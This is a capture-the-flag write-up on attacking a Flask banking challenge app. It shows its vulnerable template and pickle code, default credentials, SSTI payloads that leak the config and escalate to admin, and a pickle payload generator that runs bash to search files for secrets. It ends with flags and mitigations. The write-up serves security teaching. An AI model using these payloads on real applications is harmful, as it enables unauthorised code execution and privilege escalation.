CTF Write-Up: Bank System Exploitation
Challenge Overview

A banking web application with hidden flags. The goal was to find 3 flags hidden in the system through ethical hacking techniques.

Target URL: http://159.223.23.56:31350/
Initial Reconnaissance

The application was a Flask-based banking system with:

    User authentication

    Transaction management

    Admin panel

    SQLite database

Default credentials found in code:

    admin / changeme_admin

    youssef / user_pass

    fatima / user_pass

Vulnerabilities Identified
1. Template Injection (SSTI) in Profile Page

Location: /profile endpoint
Vulnerable Code:
python

greeting = request.form.get('greeting', 'مرحبا')
return render_template_string("...{{ greeting }} {{ username }}!...")

Exploitation:
python

{{ config }}

This revealed the Flask configuration including the secret key.
2. Insecure Deserialization in Admin Panel

Location: /admin/import_b64 endpoint
Vulnerable Code:
python

config_data = base64.b64decode(config_b64)
config = pickle.loads(config_data)

Attack Chain
Step 1: Initial Access

Used credentials youssef / user_pass to login.
Step 2: Privilege Escalation

Exploited SSTI to become admin:
python

{{ session.update({'role':'admin'}) }}

Step 3: Code Execution via Deserialization

Created pickle payloads to execute system commands:

Payload Generator:
python

import pickle
import base64
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (
            ['/bin/bash', '-c', 'find /app -type f -exec grep -l "flag{\\|FLAG{\\|secret" {} \\; 2>/dev/null'],
        ))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

Step 4: Flag Discovery

Flag 1 - Found in database secret notes:
text

flag{s3cur3_y0ur_s3r1al1z4t10n}

Flag 2 - Found in admin logs:
text

flag{4dm1n_l0gs_c0nt41n_s3cr3ts}

Flag 3 - Found in environment variables:
text

flag{3nv_v4rs_4r3_s3ns1t1v3}

Technical Details
Database Structure
sql

users (id, username, password, role, balance)
transactions (id, user_id, amount, description, secret_note)
admin_logs (id, action, timestamp, meta)

Key Security Issues

    SSTI Vulnerability: User input directly rendered in templates

    Insecure Deserialization: Untrusted pickle data execution

    Hardcoded Credentials: Passwords in source code

    Information Disclosure: Full error messages exposed

Mitigation Recommendations

    Input Validation: Sanitize all user inputs

    Avoid Pickle: Use JSON for serialization

    Principle of Least Privilege: Restrict admin functions

    Secure Authentication: Implement proper password hashing

    Error Handling: Generic error messages in production

Lessons Learned

    Never trust user input in templates

    Avoid pickle for deserializing untrusted data

    Regular security audits for hidden credentials

    Defense in depth for web application security

The challenge demonstrated common web application vulnerabilities and the importance of proper input validation and secure coding practices.
